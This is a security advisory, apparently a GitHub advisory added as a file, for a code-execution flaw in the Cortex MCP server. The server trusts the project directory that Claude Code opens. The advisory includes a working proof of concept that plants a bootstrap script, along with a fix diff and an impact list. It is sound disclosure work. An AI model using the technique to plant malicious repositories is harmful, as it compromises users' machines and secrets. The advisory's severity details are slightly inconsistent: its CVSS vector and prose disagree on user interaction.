@@ -1,0 +1,148 @@
+# [H] Cortex has Untrusted Project Bootstrap Code Execution via `CLAUDE_PROJECT_DIR`
+
+## Summary
+Severity: High
+Advisory: GHSA-gvpp-v77h-5w8g
+CVE: CVE-2026-49986
+CWE: CWE-829
+Ecosystem: PyPI
+CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
+Published: 2026-07-01
+Source: https://github.com/advisories/GHSA-gvpp-v77h-5w8g
+Type: github-advisory
+
+## Affected
+- PyPI: `neuro-cortex-memory` — affected >=0 <3.18.0
+
+## Details
+## Untrusted Project Bootstrap Code Execution via `CLAUDE_PROJECT_DIR`
+
+### Summary
+
+The Cortex MCP server (`neuro-cortex-memory`) treats the `CLAUDE_PROJECT_DIR` environment variable — automatically set by Claude Code to the currently open project directory — as a trusted Cortex developer checkout. When the `open_visualization` tool is invoked, `_find_dev_source()` resolves the user's active project directory as a candidate Cortex source root. The only validation performed by `_is_cortex_root()` is a check for the presence of an `mcp_server/` subdirectory and a `ui/unified-viz.html` file. An attacker who places these two marker files in a malicious repository can cause Cortex to execute an arbitrary `mcp_server/server/visualize_bootstrap.py` from that directory via `subprocess.run([sys.executable, ...])`, achieving code execution with the privileges of the victim's local user process. CVSS v3.1 Base Score: **7.8 (High)**.
+
+### Details
+
+The vulnerability originates in `_find_dev_source()` inside `mcp_server/handlers/open_visualization.py`. The function builds a list of candidate directories by iterating over the environment variables `CORTEX_DEV_ROOT` and `CLAUDE_PROJECT_DIR`:
+
+```python
+# mcp_server/handlers/open_visualization.py:73-76
+for env in ("CORTEX_DEV_ROOT", "CLAUDE_PROJECT_DIR"):
+    v = os.environ.get(env)
+    if v:
+        candidates.append(Path(v))
+```
+
+`CLAUDE_PROJECT_DIR` is set automatically by the Claude Code IDE extension to whichever directory the user has currently open. This means **any project the user opens** is silently treated as a candidate Cortex source root.
+
+Each candidate is then validated by `_is_cortex_root()` (lines 65–70), which only verifies that the directory contains an `mcp_server/` subdirectory and a `ui/unified-viz.html` file — trivial markers that an attacker can replicate:
+
+```python
+# mcp_server/handlers/open_visualization.py:65-70
+def _is_cortex_root(path: Path) -> bool:
+    return (path / "mcp_server").is_dir() and \
+           (path / "ui" / "unified-viz.html").is_file()
+```
+
+There is no git remote identity check, no cryptographic signature verification, no release path allowlist, and no explicit developer opt-in requirement. Once a directory passes `_is_cortex_root()`, the handler constructs a bootstrap path and executes it unconditionally:
+
+```python
+# mcp_server/handlers/open_visualization.py:179-185
+bootstrap_path = dev_src / "mcp_server" / "server" / "visualize_bootstrap.py"
+if bootstrap_path.is_file():
+    ...
+    proc = subprocess.run(
+        [sys.executable, str(bootstrap_path)],
+    )
+```
+
+A secondary code-execution path exists in `mcp_server/server/http_launcher.py:80-83` and `273-275`, where the same `CLAUDE_PROJECT_DIR`-derived dev source is used to `rsync` attacker-controlled files into the Cortex plugin cache directory before serving them.
+
+**Entry point**: MCP tool `open_visualization`, registered at `mcp_server/tool_registry_core.py:194-207` (no authentication required at tool layer). The tool is reachable through the standard stdio MCP transport started in `mcp_server/__main__.py:66`.
+
+### PoC
+
+**Prerequisites**
+
+- Cortex (`neuro-cortex-memory` ≥ 3.17.0) installed and importable.
+- Victim opens an attacker-controlled project directory in Claude Code (sets `CLAUDE_PROJECT_DIR` automatically) or the attacker otherwise controls `CLAUDE_PROJECT_DIR`.
+- Victim invokes `/cortex-visualize` or triggers the `open_visualization` MCP tool (e.g., by selecting a visualization command in the Claude Code interface).
+
+**Inline PoC**
+
+```python
+import asyncio, os, tempfile
+from pathlib import Path
+from mcp_server.handlers import open_visualization as ov
+
+base = Path(tempfile.mkdtemp(prefix="cortex-malicious-project-"))
+(base / "mcp_server" / "server").mkdir(parents=True)
+(base / "ui").mkdir()
+(base / "ui" / "unified-viz.html").write_text("<html>attacker</html>", encoding="utf-8")
+
+sentinel = Path("/tmp/cortex-open-visualization-poc-owned")
+if sentinel.exists():
+    sentinel.unlink()
+
+(base / "mcp_server" / "server" / "visualize_bootstrap.py").write_text(
+    "from pathlib import Path\n"
+    "Path('/tmp/cortex-open-visualization-poc-owned').write_text('executed', encoding='utf-8')\n"
+    "print('bootstrap-ran')\n",
+    encoding="utf-8",
+)
+
+os.environ["CLAUDE_PROJECT_DIR"] = str(base)
+ov.launch_server = lambda _typ: "http://127.0.0.1:3458"
+ov.open_in_browser = lambda _url: None
+
+result = asyncio.run(ov.handler({}))
+print(result.get("bootstrap"))
+print(sentinel.read_text())
+```
+
+Expected output:
+```
+bootstrap-ran
+executed
+```
+
+**Recommended Remediation**
+
+Remove `CLAUDE_PROJECT_DIR` from the dev-source candidate list. Gate executable dev-source resolution behind an explicit opt-in flag so that only a developer who deliberately sets both `CORTEX_DEV_SOURCE_SYNC=1` and `CORTEX_DEV_ROOT` can trigger the bootstrap path:
+
+```diff
+--- a/mcp_server/handlers/open_visualization.py
++++ b/mcp_server/handlers/open_visualization.py
+-    candidates: list[Path] = []
+-    for env in ("CORTEX_DEV_ROOT", "CLAUDE_PROJECT_DIR"):
+-        v = os.environ.get(env)
+-        if v:
+-            candidates.append(Path(v))
++    candidates: list[Path] = []
++    if os.environ.get("CORTEX_DEV_SOURCE_SYNC") == "1":
++        v = os.environ.get("CORTEX_DEV_ROOT")
++        if v:
++            candidates.append(Path(v))
+     candidates.append(Path.home() / "Documents" / "Developments" / "Cortex")
+```
+
+Apply the same change to `mcp_server/server/http_launcher.py:80-83` to eliminate the secondary rsync execution path.
+
+### Impact
+
+This is a **local arbitrary code execution** vulnerability. Any user who has the Cortex MCP plugin installed and opens (or is social-engineered into opening) an attacker-crafted project directory in Claude Code is at risk. When the victim invokes the `open_visualization` tool (e.g., via the `/cortex-visualize` slash command), attacker-controlled Python code runs immediately with the full privileges of the victim's local user account — the same privileges used by Claude Code and the Cortex MCP server process.
+
+Consequences include but are not limited to:
+
+- **Confidentiality**: exfiltration of files, secrets, environment variables, and SSH/GPG keys accessible to the local user.
+- **Integrity**: modification or deletion of local files, source code, credentials, and plugin caches.
+- **Availability**: termination of local processes or destruction of user data.
+
+The secondary path through `http_launcher.py` additionally allows the attacker to overwrite files in the Cortex plugin cache directory, potentially establishing persistence that survives after the malicious project is closed.
+
+The attack requires the victim to invoke the visualization tool (UI:R), which is reflected in the CVSS score. No elevated privileges or prior authentication to any network service are required.
+
+## References
+- https://github.com/cdeust/Cortex/security/advisories/GHSA-gvpp-v77h-5w8g
+- https://github.com/cdeust/Cortex
+- https://github.com/cdeust/Cortex/releases/tag/v3.17.1
